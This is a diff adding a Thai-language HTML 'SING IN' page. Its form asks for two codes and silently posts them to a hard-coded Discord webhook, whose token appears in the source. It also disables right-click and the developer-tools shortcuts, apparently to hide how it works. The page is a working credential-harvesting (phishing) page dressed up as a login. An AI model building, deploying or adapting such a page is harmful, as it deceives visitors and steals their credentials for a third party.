@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8" />
+  <link rel="shortcut icon" href="https://img5.pic.in.th/file/secure-sv1/LOGO0f6b1746fee8f8f5.png" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SINGIN | WEBSITE</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');
+
+    body {
+      margin: 0;
+      font-family: 'Montserrat', sans-serif;
+      background: linear-gradient(45deg, #000000, #1a0000);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      overflow: hidden;
+      position: relative;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: url('https://images.unsplash.com/photo-1618477388954-7857d6d6026d?fit=crop&w=1400&h=1000&auto=format&dpr=2') no-repeat center center;
+      background-size: cover;
+      animation: backgroundMove 30s ease-in-out infinite;
+      z-index: -1;
+      opacity: 0.35;
+      filter: blur(8px);
+    }
+
+    @keyframes backgroundMove {
+      0% { background-position: 0% 0%; }
+      50% { background-position: 100% 100%; }
+      100% { background-position: 0% 0%; }
+    }
+
+    .form-container {
+      background: rgba(20, 0, 0, 0.85);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+      width: 90%;
+      max-width: 400px;
+      position: relative;
+      z-index: 1;
+      backdrop-filter: blur(10px);
+    }
+
+    h2 {
+      text-align: center;
+      color: #ff4444;
+      margin-bottom: 20px;
+      text-shadow: 0 0 10px #ff0000, 0 0 20px #ff3333;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+
+    input {
+      background-color: rgba(255, 255, 255, 0.1);
+      color: #fff;
+      border: 1px solid #ff3333;
+    }
+
+    input::placeholder {
+      color: #ccc;
+    }
+
+    button {
+      background-color: #cc0000;
+      color: white;
+      cursor: pointer;
+      transition: background-color 0.3s ease, transform 0.2s;
+    }
+
+    button:hover {
+      background-color: #ff1a1a;
+      transform: scale(1.03);
+    }
+
+    .status {
+      text-align: center;
+      font-size: 14px;
+      margin-top: 10px;
+      color: white;
+    }
+
+    #particles-js {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -2;
+    }
+  </style>
+</head>
+<body>
+  <div id="particles-js"></div>
+
+  <div class="form-container">
+    <h2>SING IN</h2>
+    <form id="submitForm">
+      <input type="text" id="fullname" placeholder="รหัสบน" required />
+      <input type="text" id="facebook" placeholder="รหัสล่าง" required />
+      <button type="submit">สมัคร</button>
+      <div class="status" id="status"></div>
+    </form>
+  </div>
+
+  <!-- particles.js -->
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+  <script>
+    particlesJS("particles-js", {
+      "particles": {
+        "number": { "value": 60 },
+        "color": { "value": "#ff3333" },
+        "shape": { "type": "circle" },
+        "opacity": { "value": 0.3 },
+        "size": { "value": 3 },
+        "line_linked": {
+          "enable": true,
+          "distance": 150,
+          "color": "#ff3333",
+          "opacity": 0.3,
+          "width": 1
+        },
+        "move": {
+          "enable": true,
+          "speed": 2
+        }
+      },
+      "interactivity": {
+        "events": {
+          "onhover": { "enable": true, "mode": "grab" }
+        }
+      }
+    });
+  </script>
+
+  <!-- Discord webhook + form -->
+  <script>
+    const form = document.getElementById('submitForm');
+    const statusDiv = document.getElementById('status');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const name = document.getElementById('fullname').value.trim();
+      const facebook = document.getElementById('facebook').value.trim();
+
+      if (!name || !facebook) {
+        statusDiv.textContent = 'กรุณากรอกให้ครบถ้วน';
+        statusDiv.style.color = "orange";
+        return;
+      }
+
+      const content = `**มีการส่งรายชื่อใหม่**\nชื่อ: ${name}\nFacebook: ${facebook}`;
+
+      try {
+        const webhookUrl = "https://discord.com/api/webhooks/1363242918172954686/QMFDrnFwLmk7lwKMtzkDeJT1obi51ksen6SF_XJoPznW6D8DPQSoeAktSSqrvt6jm0_6";
+        const response = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content }),
+        });
+
+        if (response.ok) {
+          statusDiv.style.color = "lightgreen";
+          statusDiv.textContent = "ส่งเรียบร้อยแล้ว!";
+          form.reset();
+        } else {
+          statusDiv.style.color = "orange";
+          statusDiv.textContent = "เกิดข้อผิดพลาดในการส่ง";
+        }
+      } catch (error) {
+        statusDiv.style.color = "red";
+        statusDiv.textContent = "ไม่สามารถเชื่อมต่อกับ Discord ได้";
+      }
+    });
+
+    // Block F12 and right-click
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+      if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
+        e.preventDefault();
+      }
+    });
+  </script>
+</body>
+</html>
